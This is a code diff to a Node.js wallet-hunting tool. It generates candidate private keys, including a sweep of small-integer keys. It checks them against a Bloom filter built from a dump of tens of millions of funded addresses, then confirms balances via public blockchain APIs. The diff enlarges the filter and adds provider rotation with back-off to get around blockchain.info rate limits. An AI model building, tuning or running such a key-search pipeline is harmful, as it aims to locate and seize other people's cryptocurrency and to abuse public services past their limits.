@@ -146,16 +146,17 @@ const sharedSessionBloomView = new Int32Array(sharedSessionBloomBuffer);
 const BLOOM_TOTAL_BITS = sharedBloomView.length * 32;
 
 // ============================================================================
-// HIGH-SCALE FUNDED ADDRESS BLOOM FILTER (32 MB = 268,435,456 BITS IN SHARED RAM)
-// Holds 1,000,000 - 50,000,000 real funded addresses across ALL worker_threads with ZERO copies!
+// HIGH-SCALE FUNDED ADDRESS BLOOM FILTER — AUTO-SIZED (32 MB .. 1 GB)
+// Holds 1,000,000 - 100,000,000+ real funded addresses across ALL worker
+// threads with ZERO copies. The old FIXED 32 MB size forced ~11% false
+// positives at 57M addresses (1 in 9 random wallets became a lead, flooding
+// the verify queue). The filter now fits the dump: ~4 bytes per imported
+// address (k=4 -> FP ~ 0.01%), pinned to the size it was imported at
+// (meta.bits) so it never thrashes between runs. RWS_BLOOM_MB (32..1024)
+// overrides; after changing size, re-import the dump once to rebuild.
 // ============================================================================
-const FUNDED_BLOOM_BYTE_LENGTH = 32 * 1024 * 1024; // 32 MB SharedArrayBuffer = 268,435,456 bits
 const FUNDED_BLOOM_STORE_PATH = path.join(RUNTIME_BIN_DIR, 'funded_addresses_bloom.bin');
 const FUNDED_BLOOM_META_PATH = path.join(PERSISTENT_STATE_DIR, 'funded_addresses_meta.json');
-const sharedFundedBloomBuffer = new SharedArrayBuffer(FUNDED_BLOOM_BYTE_LENGTH);
-const sharedFundedBloomView = new Int32Array(sharedFundedBloomBuffer);
-const sharedFundedBloomBytes = new Uint8Array(sharedFundedBloomBuffer);
-const FUNDED_BLOOM_TOTAL_BITS = sharedFundedBloomView.length * 32;
 
 let fundedBloomMeta = {
   totalImported: 0,
@@ -164,6 +165,32 @@ let fundedBloomMeta = {
   sampleCount: 0,
   byChain: { BTC: 0, ETH_EVM: 0, TRX: 0, XRP: 0, LTC: 0, DOGE: 0, SOL_OTHER: 0 }
 };
+try {
+  const m0 = loadJsonOr(FUNDED_BLOOM_META_PATH, null);
+  if (m0 && typeof m0 === 'object') fundedBloomMeta = { ...fundedBloomMeta, ...m0 };
+} catch (_) {}
+
+function fundedBloomByteLength() {
+  const mbPow2 = (mb) => Math.min(1024, Math.pow(2, Math.ceil(Math.log2(Math.max(32, mb))))) * 1024 * 1024;
+  const envMb = Number(process.env.RWS_BLOOM_MB || 0);
+  if (envMb >= 32) return mbPow2(envMb);
+  // pinned to the size the current on-disk filter was imported at
+  const pinned = Number(fundedBloomMeta.bits || 0);
+  if (pinned >= 268435456) {
+    const bytes = Math.ceil(pinned / 8);
+    return Math.min(1024 * 1024 * 1024, Math.ceil(bytes / 4) * 4);
+  }
+  // auto-fit: ~4 bytes per imported address, 32 MB floor
+  const n = Number(fundedBloomMeta.totalImported || 0);
+  return mbPow2(Math.max(32, (n * 4) / (1024 * 1024)));
+}
+
+const FUNDED_BLOOM_BYTE_LENGTH = fundedBloomByteLength();
+const sharedFundedBloomBuffer = new SharedArrayBuffer(FUNDED_BLOOM_BYTE_LENGTH);
+const sharedFundedBloomView = new Int32Array(sharedFundedBloomBuffer);
+const sharedFundedBloomBytes = new Uint8Array(sharedFundedBloomBuffer);
+const FUNDED_BLOOM_TOTAL_BITS = sharedFundedBloomView.length * 32;
+console.log(`[Bloom] funded-address filter: ${(FUNDED_BLOOM_BYTE_LENGTH / (1024 * 1024)).toFixed(0)} MB (${FUNDED_BLOOM_TOTAL_BITS.toLocaleString()} bits)`);
 
 /**
  * Est. false-positive rate of the funded-address Bloom filter.
@@ -285,6 +312,7 @@ function saveFundedBloomStore() {
   savingFundedBloom = true;
   setImmediate(async () => {
     try {
+      fundedBloomMeta.bits = FUNDED_BLOOM_TOTAL_BITS;
       await fs.promises.writeFile(FUNDED_BLOOM_STORE_PATH, Buffer.from(sharedFundedBloomBytes));
       await writeFileAtomicAsync(FUNDED_BLOOM_META_PATH, JSON.stringify(fundedBloomMeta, null, 2));
     } catch (_) {
@@ -348,6 +376,71 @@ let bloomGzipImport = { running: false, bytesIn: 0, linesParsed: 0, added: 0, st
     fundedBloomIntegrity = { ok: true, detail: `${claimed.toLocaleString()} addresses verified on disk` };
   }
 })();
+
+/* ── BTC balance providers: rotate + back off on 429 ──────────────────────
+   blockchain.info/multiaddr is the fast batch provider but rate-limits hard
+   (86% HTTP 429 against a 57M-address dump). On 429/timeout the call moves
+   to mempool.space / blockstream.info (esplora) and the failing provider
+   cools down exponentially instead of being hammered. */
+const btcBalanceProviders = [
+  { id: 'blockchain.info', kind: 'multi' },
+  { id: 'mempool.space', kind: 'esplora' },
+  { id: 'blockstream.info', kind: 'esplora' }
+];
+const btcProviderState = {};
+function btcProviderStatus(id) {
+  return btcProviderState[id] || (btcProviderState[id] = { cooldownUntil: 0, strikes: 0 });
+}
+function btcProviderPick() {
+  const now = Date.now();
+  for (const p of btcBalanceProviders) {
+    if (btcProviderStatus(p.id).cooldownUntil <= now) return p;
+  }
+  return btcBalanceProviders[0]; // all cooling — try anyway rather than stall
+}
+function btcProviderPenalize(p) {
+  const st = btcProviderStatus(p.id);
+  st.strikes = Math.min(6, st.strikes + 1);
+  st.cooldownUntil = Date.now() + Math.min(120000, 5000 * Math.pow(2, st.strikes - 1));
+}
+function btcProviderReward(p) {
+  btcProviderStatus(p.id).strikes = 0;
+}
+
+/** Batch BTC balance lookup with provider rotation. Resolves to rows shaped
+ *  like blockchain.info multiaddr ({address, final_balance, total_received, n_tx}). */
+async function btcFetchBalances(addrs) {
+  const p = btcProviderPick();
+  try {
+    if (p.kind === 'multi') {
+      const data = await httpsJsonRequest(`https://blockchain.info/multiaddr?active=${encodeURIComponent(addrs.join('|'))}&n=0`, 'GET', null, 1800);
+      if (!data || !Array.isArray(data.addresses) || data.addresses.length === 0) throw new Error('empty multiaddr payload');
+      btcProviderReward(p);
+      return data.addresses;
+    }
+    // esplora fallbacks: per-address, capped per call so one batch cannot stall the pump
+    const rows = [];
+    for (const a of addrs.slice(0, 25)) {
+      const d = await httpsJsonRequest(`https://${p.id}/api/address/${encodeURIComponent(a)}`, 'GET', null, 1800);
+      const chain = (d && d.chain_stats) || {};
+      const mem = (d && d.mempool_stats) || {};
+      const funded = Number(chain.funded_txo_sum || 0) + Number(mem.funded_txo_sum || 0);
+      const spent = Number(chain.spent_txo_sum || 0) + Number(mem.spent_txo_sum || 0);
+      rows.push({
+        address: a,
+        final_balance: Math.max(0, funded - spent),
+        total_received: Number(chain.funded_txo_sum || 0),
+        n_tx: Number(chain.tx_count || 0)
+      });
+    }
+    if (rows.length === 0) throw new Error('esplora returned no rows');
+    btcProviderReward(p);
+    return rows;
+  } catch (e) {
+    btcProviderPenalize(p);
+    throw e;
+  }
+}
 
 function bloomFnv1aHashes(str) {
   let h1 = 0x811c9dc5;
@@ -2387,7 +2480,7 @@ function saveApiKeysConfig() {
    file instead of guesswork. Everything here is read-only telemetry: it never
    invents a balance, never promotes a lead and never touches a vault.
    ──────────────────────────────────────────────────────────────────────── */
-const APP_VERSION = '2.9.0-beta.4';
+const APP_VERSION = '2.9.0-beta.5';
 const DIAG_LOG_FILE = path.join(PERSISTENT_STATE_DIR, 'diagnostics.log');
 const DIAG_REPORT_FILE = path.join(PERSISTENT_STATE_DIR, 'DIAGNOSTIC_REPORT.txt');
 const DIAG_BOOT_AT = Date.now();
@@ -2948,7 +3041,7 @@ function diagnosticsReportText(snapshot) {
   L.push('FIND FUNNEL — why (not) finding wallets');
   L.push(`  candidates generated ${s.funnel.generated.toLocaleString()}`);
   L.push(`  fabric               ${s.funnel.fabricFunded.toLocaleString()} funded addresses · ${s.funnel.fabricTargets.toLocaleString()} targets`);
-  L.push(`  matches queued       ${s.funnel.leadsQueued.toLocaleString()} leads · bloom FP ${(s.funnel.falsePositiveRate * 100).toFixed(3)}%`);
+  L.push(`  matches queued       ${s.funnel.leadsQueued.toLocaleString()} leads · bloom FP ${(((s.funnel.falsePositiveRate || fundedBloomFalsePositiveRate()) * 100).toFixed(3))}%`);
   L.push(`  verdicts             ${s.funnel.verdicts.toLocaleString()} checked · ${s.funnel.confirmedEmpty.toLocaleString()} empty · ${s.funnel.unanswered.toLocaleString()} unanswered`);
   L.push(`  confirmed            ${s.funnel.confirmedFunded.toLocaleString()} funded · ${s.funnel.confirmedEverHeld.toLocaleString()} ever-held`);
   L.push(`  small-int sweep      through key ${s.funnel.smallIntNext.toLocaleString()} · ${s.funnel.smallIntChecked.toLocaleString()} keys checked (finite family)`);
@@ -3526,13 +3619,13 @@ async function verifyBatchLiveOnServer(items, enabledChains = ['BTC', 'ETH', 'US
       const allBtc = Array.from(btcMap.keys()).slice(0, 100);
       if (allBtc.length > 0) {
         tasks.push(
-          diagTrackTask('BTC', httpsJsonRequest(`https://blockchain.info/multiaddr?active=${encodeURIComponent(allBtc.join('|'))}&n=0`, 'GET', null, 1800))
-            .then(data => {
+          diagTrackTask('BTC', btcFetchBalances(allBtc))
+            .then(rows => {
               liveRpcRequestsSent++;
               liveRpcAddressesChecked += allBtc.length;
-              if (data && Array.isArray(data.addresses)) {
+              if (Array.isArray(rows) && rows.length > 0) {
                 for (const it of btcMap.values()) it.rpcChainsAnswered = (it.rpcChainsAnswered || 0) + 1;
-                for (const row of data.addresses) {
+                for (const row of rows) {
                   const owner = btcMap.get(row.address);
                   if (!owner) continue;
                   const finalSats = Number(row.final_balance || 0);
